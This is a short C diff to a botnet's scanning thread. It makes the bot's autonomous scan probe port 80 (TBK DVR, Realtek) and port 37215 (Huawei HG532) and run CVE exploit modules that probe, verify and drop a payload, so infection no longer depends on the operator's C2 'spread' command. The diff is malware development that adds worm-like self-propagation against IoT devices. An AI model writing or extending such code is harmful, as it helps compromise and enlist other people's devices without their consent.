@@ -2615,6 +2615,18 @@ static void *scan_thread_fn(void *arg) {
                 }
             }
         }
+        /* #97: CVE ports — the autonomous scan must reach 80 (TBK DVR,
+         * Realtek) and 37215 (HG532), otherwise known-CVE exploitation
+         * only ever fires from the C2 `spread` command. These run
+         * unconditionally (CVE-first primary vector, #83); cve_run_modules
+         * does probe -> verify -> drop and returns -1 when nothing fires.
+         * Port 80 covers both TBK and Realtek modules (same port). */
+        if (scan_port_with_timeout(ip_str, TBK_DVR_PORT, timeout) == 0) {
+            cve_run_modules(bot, ip_str, TBK_DVR_PORT);
+        }
+        if (scan_port_with_timeout(ip_str, HG532_PORT, timeout) == 0) {
+            cve_run_modules(bot, ip_str, HG532_PORT);
+        }
     }
 
     return NULL;
